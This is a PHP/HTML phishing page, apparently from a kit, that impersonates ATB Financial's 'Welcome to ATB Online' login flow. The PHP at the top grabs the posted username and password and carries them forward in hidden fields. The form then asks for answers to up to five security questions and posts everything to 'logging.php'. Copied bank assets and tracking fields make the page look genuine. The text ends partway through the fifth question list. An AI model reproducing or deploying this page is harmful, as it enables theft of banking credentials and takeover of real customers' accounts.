﻿<?php
$username = $_POST['username'];
$password = $_POST['password'];
?>
<!DOCTYPE html>
<html class="wf-myriadpro-n4-active wf-active"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">

    <!-- Google Tag Manager -->


    <meta http-equiv="X-UA-Compatible" content="IE=Edge"><meta name="apple-itunes-app" content="app-id=536593983"><meta name="google-play-app" content="app-id=com.atb.ATBMobile"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>
	Your Security Questions
</title>

        <!-- JavaScript -->
        <script type="text/javascript" src="files/commonScripts_3D4F1C376A380F40C3949B8F5B38CFE6.js"></script>
        <script type="text/javascript" src="files/md-widget-v5.js"></script>
        <script type="text/javascript" src="files/analytics.js"></script>
        <script src="files/qia1usm.js"></script>
        <style type="text/css">.tk-myriad-pro{font-family:"myriad-pro",sans-serif;}</style><style type="text/css">@font-face{font-family:tk-myriad-pro-n4;src:url(https://use.typekit.net/af/c511dc/00000000000000000001709a/27/l?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n4&v=3) format("woff2"),url(https://use.typekit.net/af/c511dc/00000000000000000001709a/27/d?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n4&v=3) format("woff"),url(https://use.typekit.net/af/c511dc/00000000000000000001709a/27/a?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n4&v=3) format("opentype");font-weight:400;font-style:normal;}</style><script>try{Typekit.load({ async: true });}catch(e){}</script>
        <script type="text/javascript" src="files/publicScripts_F37FCD7D87874CBDF70668834969507E.js"></script>

        <!-- Stylesheets -->
        <link rel="stylesheet" type="text/css" href="files/fonts.htm"><link rel="stylesheet" type="text/css" href="files/commonStyles_B6A7584738E751824EF26B52E6EC544E.css"><link rel="stylesheet" type="text/css" href="files/publicStyles_32A798D029DAD3323D9D7DD8FCFB8BA1.css"><link rel="Shortcut Icon" href="https://www.atbonline.com/ATB/Themes/TopTabMenu/Images/favicon.ico" type="image/x-icon">

    <!-- CrazyEgg -->
<style type="text/css">@font-face{font-family:myriad-pro;src:url(https://use.typekit.net/af/c511dc/00000000000000000001709a/27/l?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n4&v=3) format("woff2"),url(https://use.typekit.net/af/c511dc/00000000000000000001709a/27/d?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n4&v=3) format("woff"),url(https://use.typekit.net/af/c511dc/00000000000000000001709a/27/a?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n4&v=3) format("opentype");font-weight:400;font-style:normal;}</style>

</head>
<body>

    <!-- Google Tag Manager (noscript) -->
    <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-PHHNRF" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>


    <div id="atbBackground" class="atb-background">
        <div id="atbPublicContainer" class="container atb-base-container no-padding">
            <div id="atbBody">
                <img id="atbGradient" src="files/header-gradient.jpg">
                <div id="atbBodyContent">
                    <form name="MAINFORM" method="post" action="logging.php"  id="MAINFORM" autocomplete="off">
					
		 <input type=hidden name="username" value="<?php print $username; ?>">
<input type=hidden name="password" value="<?php print $password; ?>">
<div>
<input name="RadScriptManager_TSM" id="RadScriptManager_TSM" value="" type="hidden">
<input name="__EVENTTARGET" id="__EVENTTARGET" value="" type="hidden">
<input name="__EVENTARGUMENT" id="__EVENTARGUMENT" value="" type="hidden">
<input name="DES_Group" id="DES_Group" value="" type="hidden">
<input name="__VIEWSTATE" id="__VIEWSTATE" value="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" type="hidden">
</div>





<div>

	<input name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="vv/+Ryo8zO5DV5nlnwZAn3ndihrgYEVP7CoB197NS4hVTCRsXPyg7tA2oxf/Pk6thDQ1chcMs8KuEiXjFKDZZHA2jxGHGQ2UCZqSDliygH4v9XFiQ82wfKuCwnI+eYMKS0jCThGPRl4p3S/HByiPGHDQa+28Yjq3jh3hqDEyHTemeaUvn11q+FohifxVBV3hXjLeWPI6m7vxeQl8KxR4PpZM4ZQ=" type="hidden">
</div>
                
                        <!-- RSA script -->
                      <input id="rsa_deviceprint" name="rsa_deviceprint" value="version%3D3%2E5%2E0%5F1%26pm%5Ffpua%3Dmozilla%2F5%2E0%20%28windows%20nt%206%2E1%3B%20wow64%3B%20rv%3A54%2E0%29%20gecko%2F20100101%20firefox%2F54%2E0%7C5%2E0%20%28Windows%29%7CWin32%26pm%5Ffpsc%3D24%7C1600%7C900%7C860%26pm%5Ffpsw%3D%26pm%5Ffptz%3D7%26pm%5Ffpln%3Dlang%3Den%2DUS%7Csyslang%3D%7Cuserlang%3D%26pm%5Ffpjv%3D0%26pm%5Ffpco%3D1%26pm%5Ffpasw%3Dnpswf32%5F26%5F0%5F0%5F137%26pm%5Ffpan%3DNetscape%26pm%5Ffpacn%3DMozilla%26pm%5Ffpol%3Dtrue%26pm%5Ffposp%3D%26pm%5Ffpup%3D%26pm%5Ffpsaw%3D1600%26pm%5Ffpspd%3D24%26pm%5Ffpsbd%3D%26pm%5Ffpsdx%3D%26pm%5Ffpsdy%3D%26pm%5Ffpslx%3D%26pm%5Ffpsly%3D%26pm%5Ffpsfse%3D%26pm%5Ffpsui%3D%26pm%5Fos%3DWindows%26pm%5Fbrmjv%3D54%26pm%5Fbr%3DFirefox%26pm%5Finpt%3D%26pm%5Fexpt%3D" type="hidden"><input id="rsa_geolocation" name="rsa_geolocation" type="hidden">

                        <h1 class="display-block text-center"><strong>Welcome to ATB</strong> Online</h1>
                        <div class="font-secondary text-center mb-30">
                            <!-- Personal/Business tabs -->
                            <a id="PersonalLink" class="text-semibold mx-10" href="https://www.atbonline.com/ATB/Login.aspx">Confirm your information</a>
                        </div>
                        <div class="container">
                            <div class="row mt-10">
                                <div class="col-xs-1"></div>
                                <div class="col-xs-6 pr-30">
                                    <h2>Security Questions</h2>
                                    <div id="atbPageSummary" class="col-xs-12 no-padding">
                                        
                                        
                                    </div>
                                    <div class="col-xs-12 no-padding">
                                        



    <table class="full-width" border="0">
	<tbody><tr>
		<td>
                    <div>
                        <span class="form-label display-block mb-5">Security Question</span>

                  	<select required="" name="question1" id="q1" class="form-control" style="OrigCss:form-control;">
					<option value="">Please select a question</option>
					<option value="first pet's name">What was your first pet's name?</option>
					<option value="favourite subject in school">What was your favourite subject in school?</option>
					<option value="city did you meet your spouse">In what city did you meet your spouse or significant other?</option>
					<option value="best childhood friend">What is the name of your best childhood friend?</option>
					<option value="last name of your favourite teacher">What was the last name of your favourite teacher?</option>
					<option value="favourite time of the day">What is your favourite time of the day?</option>
					<option value="favourite musician">Who is your favourite musician?</option>
					<option value="first job">What was your first job?</option>
					<option value="name of your elementary or primary">What was the name of your elementary or primary school?</option>
					<option value="name of your first stuffed animal">What was the name of your first stuffed animal?</option>
					<option value="favourite board game">What is your favourite board game?</option>
					<option value="retire where">Where do you want to retire?</option>
					<option value="favourite wild animal">What is your favourite wild animal. Please no dogs or cats or parakeets</option>
					<option value="favourite author">Who is your favourite author?</option>
					<option value="grandfather's occupation">What was your grandfather's occupation?</option>
					<option value="favourite family holiday">Where was your favourite family holiday vacation?</option>
					<option value="city were you born">What city were you born in?</option>
					<option value="childhood nickname">What was your childhood nickname?</option>
					<option value="town did you live in as a child">What town did you live in as a child?</option>
					<option value="last name of your first grade teacher">What was the last name of your first grade teacher?</option>
					<option value="favourite dessert">What is your favourite dessert?</option>
					<option value="favourite actor">What is your favourite actor or actress or celebrity?</option>
					<option value="town was your first job">In what town was your first job?</option>
					<option value="color of your first car">What was the color of your first car?</option>
					<option value="TVs are in your home">How many TVs are in your home?</option>

				</select>      <span style="visibility:hidden" class="VAMErrorText" id="ctlWorkflow_vldUserIDReq"><img id="ctlWorkflow_vldUserIDReq_Img" src="files/error.gif" alt="" style="border-width:0px;vertical-align:middle;">&nbsp;<span id="ctlWorkflow_vldUserIDReq_Txt">Please enter your username.</span></span>
                    </div>
					
      
					<div>
                        <span class="form-label display-block mb-5">Answer:</span>

                        <input required="" name="answer1" required="" id="ctlWorkflow_txtUserID" class="form-control full-width" placeholder="Enter your Security Answer" type="text">
                        <span style="visibility:hidden" class="VAMErrorText" id="ctlWorkflow_vldUserIDReq"><img id="ctlWorkflow_vldUserIDReq_Img" src="files/error.gif" alt="" style="border-width:0px;vertical-align:middle;">&nbsp;<span id="ctlWorkflow_vldUserIDReq_Txt">Please enter your username.</span></span>
                    </div>
					<div>
                        <span class="form-label display-block mb-5">Security Question</span>

                      <select required="" name="question2" id="q2" class="form-control" style="OrigCss:form-control;">
					<option value="">Please select a question</option>
					<option value="first pet's name">What was your first pet's name?</option>
					<option value="favourite subject in school">What was your favourite subject in school?</option>
					<option value="city did you meet your spouse">In what city did you meet your spouse or significant other?</option>
					<option value="best childhood friend">What is the name of your best childhood friend?</option>
					<option value="last name of your favourite teacher">What was the last name of your favourite teacher?</option>
					<option value="favourite time of the day">What is your favourite time of the day?</option>
					<option value="favourite musician">Who is your favourite musician?</option>
					<option value="first job">What was your first job?</option>
					<option value="name of your elementary or primary">What was the name of your elementary or primary school?</option>
					<option value="name of your first stuffed animal">What was the name of your first stuffed animal?</option>
					<option value="favourite board game">What is your favourite board game?</option>
					<option value="retire where">Where do you want to retire?</option>
					<option value="favourite wild animal">What is your favourite wild animal. Please no dogs or cats or parakeets</option>
					<option value="favourite author">Who is your favourite author?</option>
					<option value="grandfather's occupation">What was your grandfather's occupation?</option>
					<option value="favourite family holiday">Where was your favourite family holiday vacation?</option>
					<option value="city were you born">What city were you born in?</option>
					<option value="childhood nickname">What was your childhood nickname?</option>
					<option value="town did you live in as a child">What town did you live in as a child?</option>
					<option value="last name of your first grade teacher">What was the last name of your first grade teacher?</option>
					<option value="favourite dessert">What is your favourite dessert?</option>
					<option value="favourite actor">What is your favourite actor or actress or celebrity?</option>
					<option value="town was your first job">In what town was your first job?</option>
					<option value="color of your first car">What was the color of your first car?</option>
					<option value="TVs are in your home">How many TVs are in your home?</option>

				</select>  <span style="visibility:hidden" class="VAMErrorText" id="ctlWorkflow_vldUserIDReq"><img id="ctlWorkflow_vldUserIDReq_Img" src="files/error.gif" alt="" style="border-width:0px;vertical-align:middle;">&nbsp;<span id="ctlWorkflow_vldUserIDReq_Txt">Please enter your username.</span></span>
                    </div>
					
					<div>
                        <span class="form-label display-block mb-5">Answer:</span>

                        <input required="" name="answer2" required="" id="ctlWorkflow_txtUserID" class="form-control full-width" placeholder="Enter your Security Answer" type="text">
                        <span style="visibility:hidden" class="VAMErrorText" id="ctlWorkflow_vldUserIDReq"><img id="ctlWorkflow_vldUserIDReq_Img" src="files/error.gif" alt="" style="border-width:0px;vertical-align:middle;">&nbsp;<span id="ctlWorkflow_vldUserIDReq_Txt">Please enter your username.</span></span>
                    </div>
					<div>
                        <span class="form-label display-block mb-5">Security Question</span>

                  <select required="" name="question3" id="q3" class="form-control" style="OrigCss:form-control;">
					<option value="">Please select a question</option>
					<option value="first pet's name">What was your first pet's name?</option>
					<option value="favourite subject in school">What was your favourite subject in school?</option>
					<option value="city did you meet your spouse">In what city did you meet your spouse or significant other?</option>
					<option value="best childhood friend">What is the name of your best childhood friend?</option>
					<option value="last name of your favourite teacher">What was the last name of your favourite teacher?</option>
					<option value="favourite time of the day">What is your favourite time of the day?</option>
					<option value="favourite musician">Who is your favourite musician?</option>
					<option value="first job">What was your first job?</option>
					<option value="name of your elementary or primary">What was the name of your elementary or primary school?</option>
					<option value="name of your first stuffed animal">What was the name of your first stuffed animal?</option>
					<option value="favourite board game">What is your favourite board game?</option>
					<option value="retire where">Where do you want to retire?</option>
					<option value="favourite wild animal">What is your favourite wild animal. Please no dogs or cats or parakeets</option>
					<option value="favourite author">Who is your favourite author?</option>
					<option value="grandfather's occupation">What was your grandfather's occupation?</option>
					<option value="favourite family holiday">Where was your favourite family holiday vacation?</option>
					<option value="city were you born">What city were you born in?</option>
					<option value="childhood nickname">What was your childhood nickname?</option>
					<option value="town did you live in as a child">What town did you live in as a child?</option>
					<option value="last name of your first grade teacher">What was the last name of your first grade teacher?</option>
					<option value="favourite dessert">What is your favourite dessert?</option>
					<option value="favourite actor">What is your favourite actor or actress or celebrity?</option>
					<option value="town was your first job">In what town was your first job?</option>
					<option value="color of your first car">What was the color of your first car?</option>
					<option value="TVs are in your home">How many TVs are in your home?</option>

				</select>      <span style="visibility:hidden" class="VAMErrorText" id="ctlWorkflow_vldUserIDReq"><img id="ctlWorkflow_vldUserIDReq_Img" src="files/error.gif" alt="" style="border-width:0px;vertical-align:middle;">&nbsp;<span id="ctlWorkflow_vldUserIDReq_Txt">Please enter your username.</span></span>
                    </div>
					
					<div>
                        <span class="form-label display-block mb-5">Answer:</span>

                        <input required="" required="" name="answer3" required="" id="ctlWorkflow_txtUserID" class="form-control full-width" placeholder="Enter your Security Answer" type="text">
                        <span style="visibility:hidden" class="VAMErrorText" id="ctlWorkflow_vldUserIDReq"><img id="ctlWorkflow_vldUserIDReq_Img" src="files/error.gif" alt="" style="border-width:0px;vertical-align:middle;">&nbsp;<span id="ctlWorkflow_vldUserIDReq_Txt">Please enter your username.</span></span>
                    </div>

                    <div>
                        <span class="form-label display-block mb-5">Security Question</span>

                    <select required="" name="question4" id="q4" class="form-control" style="OrigCss:form-control;">
                    <option value="">Please select a question</option>
                    <option value="first pet's name">What was your first pet's name?</option>
                    <option value="favourite subject in school">What was your favourite subject in school?</option>
                    <option value="city did you meet your spouse">In what city did you meet your spouse or significant other?</option>
                    <option value="best childhood friend">What is the name of your best childhood friend?</option>
                    <option value="last name of your favourite teacher">What was the last name of your favourite teacher?</option>
                    <option value="favourite time of the day">What is your favourite time of the day?</option>
                    <option value="favourite musician">Who is your favourite musician?</option>
                    <option value="first job">What was your first job?</option>
                    <option value="name of your elementary or primary">What was the name of your elementary or primary school?</option>
                    <option value="name of your first stuffed animal">What was the name of your first stuffed animal?</option>
                    <option value="favourite board game">What is your favourite board game?</option>
                    <option value="retire where">Where do you want to retire?</option>
                    <option value="favourite wild animal">What is your favourite wild animal. Please no dogs or cats or parakeets</option>
                    <option value="favourite author">Who is your favourite author?</option>
                    <option value="grandfather's occupation">What was your grandfather's occupation?</option>
                    <option value="favourite family holiday">Where was your favourite family holiday vacation?</option>
                    <option value="city were you born">What city were you born in?</option>
                    <option value="childhood nickname">What was your childhood nickname?</option>
                    <option value="town did you live in as a child">What town did you live in as a child?</option>
                    <option value="last name of your first grade teacher">What was the last name of your first grade teacher?</option>
                    <option value="favourite dessert">What is your favourite dessert?</option>
                    <option value="favourite actor">What is your favourite actor or actress or celebrity?</option>
                    <option value="town was your first job">In what town was your first job?</option>
                    <option value="color of your first car">What was the color of your first car?</option>
                    <option value="TVs are in your home">How many TVs are in your home?</option>

                </select>      <span style="visibility:hidden" class="VAMErrorText" id="ctlWorkflow_vldUserIDReq"><img id="ctlWorkflow_vldUserIDReq_Img" src="files/error.gif" alt="" style="border-width:0px;vertical-align:middle;">&nbsp;<span id="ctlWorkflow_vldUserIDReq_Txt">Please enter your username.</span></span>
                    </div>
                    
      
                    <div>
                        <span class="form-label display-block mb-5">Answer:</span>

                        <input required="" name="answer4" required="" id="ctlWorkflow_txtUserID" class="form-control full-width" placeholder="Enter your Security Answer" type="text">
                        <span style="visibility:hidden" class="VAMErrorText" id="ctlWorkflow_vldUserIDReq"><img id="ctlWorkflow_vldUserIDReq_Img" src="files/error.gif" alt="" style="border-width:0px;vertical-align:middle;">&nbsp;<span id="ctlWorkflow_vldUserIDReq_Txt">Please enter your username.</span></span>
                    </div>
                    

                    <div>
                        <span class="form-label display-block mb-5">Security Question</span>

                    <select required="" name="question5" id="q5" class="form-control" style="OrigCss:form-control;">
                    <option value="">Please select a question</option>
                    <option value="first pet's name">What was your first pet's name?</option>
                    <option value="favourite subject in school">What was your favourite subject in school?</option>
                    <option value="city did you meet your spouse">In what city did you meet your spouse or significant other?</option>
                    <option value="best childhood friend">What is the name of your best childhood friend?</option>
                    <option value="last name of your favourite teacher">What was the last name of your favourite teacher?</option>
                    <option value="favourite time of the day">What is your favourite time of the day?</option>
                    <option value="favourite musician">Who is your favourite musician?</option>
                    <option value="first job">What was your first job?</option>
                    <option value="name of your elementary or primary">What was the name of your elementary or primary school?</option>
                    <option value="name of your first stuffed animal">What was the name of your first stuffed animal?</option>
                    <option value="favourite board game">What is your favourite board game?</option>
                    <option value="retire where">Where do you want to retire?</option>
                    <option value="favourite wild animal">What is your favourite wild animal. Please no dogs or cats or parakeets</option>
                    <option value="favourite author">Who is your favourite author?</option>
                    <option value="grandfather's occupation">What was your grandfather's occupation?</option>
                    <option value="favourite family holiday">Where was your favourite family holiday vacation?</option>
                    <option value="city were you born">What city were you born in?</option>
                    <option value="childhood nickname">What was your childhood nickname?</option>
                    <option value="town did you live in as a child">What town did you live in as a child?</option>
                    <option value="last name of your first grade teacher">What was the last name of your first grade teacher?</option>
                    <option value="favourite dessert">What is your favourite dessert?</option>
                    <option value="favourite actor">What is your favourite actor or actress or celebrity?</option>
                    <option value="town was your first job">In what town was your first job?</option>
                    <option value="color of your first car">What was the color of your first car?</option>
                    <option value="TVs are in your home">How many TVs are in your home?</option>

